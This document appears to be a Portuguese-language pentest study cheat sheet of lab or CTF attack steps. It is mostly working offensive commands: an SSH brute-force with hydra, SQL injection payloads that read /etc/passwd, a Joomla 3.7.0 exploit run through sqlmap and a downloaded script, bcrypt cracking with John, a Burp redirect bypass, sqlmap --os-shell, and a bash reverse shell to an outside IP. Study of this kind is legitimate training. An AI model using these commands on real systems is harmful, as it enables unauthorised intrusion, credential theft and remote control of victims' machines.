# teste-estudoPentest
Web Vulnerability Scanner:
W3AF
Dnsenum
Echo %STRING | base64 -d

Brute force
hydra -l %USERNAME -P wordlist.txt %IP ssh

Linux Privilege Escalation Awesome Script
# Use a linpeas binary
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64

Enumerar diretórios pelo IP que tem o site rodando
gobuster dir -w /home/kali/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt %IP

SQL injection (depois de logado)
uname=admin' union select 1,load_file("/etc/passwd"),3,4,5,6 -- &password=admin

uname=admin' union select 1,load_file("/etc/apache2/sites-enabled/000-default.conf"),3,4,5,6 -- &password=admin

Joomla Scan
joomscan -u %LINK
Sendo encontrado a versao Joomla 3.7.0
searchsploit joomla 3.7.0
searchsploit -m %ID_DA_VUL_EX_42033
cat %ID_EX_42033
É apresentado que é possível explorar através de sqlmap com determinado comando onde %IP, está http://localhost
sqlmap -u " http:%IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dump-all -p list[fullordering]
ou
wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py
python2.7 joomblah.py http://$IP
•	Usuário exposto e hash da senha exposta
•	pesquisar pelo tipo da hash em hashes.com, identificado bcrypt
•	salvar a hash em txt
•	rodar o John pra formato bcrypt
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
senha encontrada em texto plano na comparação
logar no joomla
nc -nvlp 1234
editar a configuração do joomla para ip e abrir a mesma porta EX: 1234

Novo teste
nmap -A %IP
Encontrado 80 http site
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --url http://10.129.95.185/ -x php
Encontrar algumas páginas criadas como nav.php, dentro foi possível criar uma conta
Pegar a resposta, botão direito no Burp, “do intercept”; “Response to this request”; trocar a resposta de 302 pra 200 ( pre )

Teste com SQLI
•	Verificar o certificado SSL e o “Common name” do mesmo pra qual endereço web   refere, adicionar este endereço para /etc/hosts
•	Tentar abrir o site novamente
•	Adicionar nome e senha randômicos no Burp, para capturar a requisição.
•	E rodar sqlmap:
sqlmap -r $Request_salva.txt --dbs --force-ssl –batch
Ao apresentar alguns bancos disponíveis, tentar dumpar:
	sqlmap -r $Request_salva.txt --dbs --force-ssl -D $nome_do_database_exposto --dump-all –batch
Retornado as credenciais de admin e senha:
sqlmap -r req.txt --force-ssl --batch --os-shell
sqlmap -r req.txt --force-ssl --batch --os-shell --flush-session --time-sec=20
bash -c 'bash -i &> /dev/tcp/10.10.14.100/4444 0>&1'

Teste 
nmap -sV -sC %IP_EXTENSO
Pegar o ssl-cert Subject: commonName do resultado: %ENDEREÇO_POR_EXTENSO
Adicionar ao /etc/hosts o ip: %IP_EXTENSO %ENDEREÇO_POR_EXTENSO
Tentar acessar os endereços com as portas listadas no nmap






